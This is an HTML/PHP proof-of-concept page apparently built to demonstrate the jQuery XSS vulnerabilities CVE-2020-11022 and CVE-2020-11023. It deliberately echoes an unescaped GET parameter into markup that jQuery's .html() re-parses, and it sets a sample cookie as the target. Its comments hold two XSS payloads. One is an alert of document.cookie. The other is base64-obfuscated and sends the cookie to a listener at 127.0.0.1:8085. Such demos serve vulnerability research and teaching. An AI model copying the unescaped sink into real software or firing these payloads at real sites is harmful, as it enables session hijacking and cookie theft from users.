
<!DOCTYPE html>
<html>
<head>
    <title>CVE-2020-11022 & CVE-2020-11023</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js"></script>
</head>
<body>
<script>

function testfunc(){
    testvar = document.getElementById('id').innerHTML;
    $('#div').html(testvar);
}
</script>

<?php setcookie("cookie", "random-sensitive-data"); ?>

<h1>jQuery CVE-2020-11022 & CVE-2020-11023</h1>

<h2>Click</h2>
<button onclick="testfunc()">Append via .html()</button>
<xmp id="id">
<img alt="<x" title="<?php echo($_GET['value']); ?>">
</xmp>

<div id="div"></div>

<!-- ?value=/><img src=x onerror=alert(document.cookie)> -->

<!-- ?value=/><img src=x onerror=eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly8xMjcuMC4wLjE6ODA4NS8/Yz0iK2RvY3VtZW50LmNvb2tpZQ=='))> -->

</body>
</html>
